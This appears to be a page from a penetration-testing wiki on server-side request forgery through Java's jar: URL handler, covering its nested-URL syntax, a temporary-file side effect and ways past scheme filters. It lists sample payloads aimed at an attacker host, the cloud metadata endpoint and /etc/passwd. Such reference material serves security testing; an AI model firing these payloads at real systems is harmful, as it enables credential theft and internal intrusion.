---
title: "JAR scheme SSRF on Java stacks"
description: "The Java jar: URL handler fetches a nested URL to read an entry from an archive, which forces an outbound request to an attacker-chosen host and writes a downloaded archive to a temporary file."
keywords:
  - jar scheme
  - jar url handler
  - Java SSRF
  - nested URL
  - temporary file
---

# JAR

`jar:` is a Java URL handler that addresses an entry inside an archive. Its form nests another URL, the location of the archive, before a `!/` separator and the entry path:

```
jar:http://attacker.example/evil.jar!/
jar:http://169.254.169.254/latest/meta-data/!/
jar:file:///etc/passwd!/
```

To resolve the entry, the handler first fetches the nested URL, so a Java client that honors `jar:` performs an outbound request to whatever host the inner URL names. That makes it an SSRF vector in its own right, reaching internal `http://` targets and the metadata endpoint through the inner URL even when the application's own scheme checks only looked at the outer `jar:` prefix.

## The temporary-file side effect

Resolving a remote `jar:` URL downloads the nested archive to a temporary file on disk before reading the requested entry. That write happens as a side effect of the fetch, so a `jar:http://...` URL both issues the SSRF request and drops attacker-controlled bytes into a temp location, which can matter where another component later processes files from that directory.

## When to reach for it

`jar:` is specific to JVM HTTP clients and URL handling. It is worth trying when the stack is Java and a direct [HTTP](http-and-https.md) or [File](file.md) scheme is filtered but `jar:` is not, since the nested URL smuggles the same targets past a prefix check. Confirm the handler by pointing the inner URL at an attacker-controlled listener and watching for the fetch.

## Tools

- **curl**: manual `jar:` probing with the nested URL pointed at a controlled listener.
- **interactsh**: open-source out-of-band interaction server to confirm the nested fetch on blind cases.
- Manual testing with Burp Repeater and crafted payloads.

## References

- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Oracle: JAR URL syntax](https://docs.oracle.com/javase/8/docs/api/java/net/JarURLConnection.html)
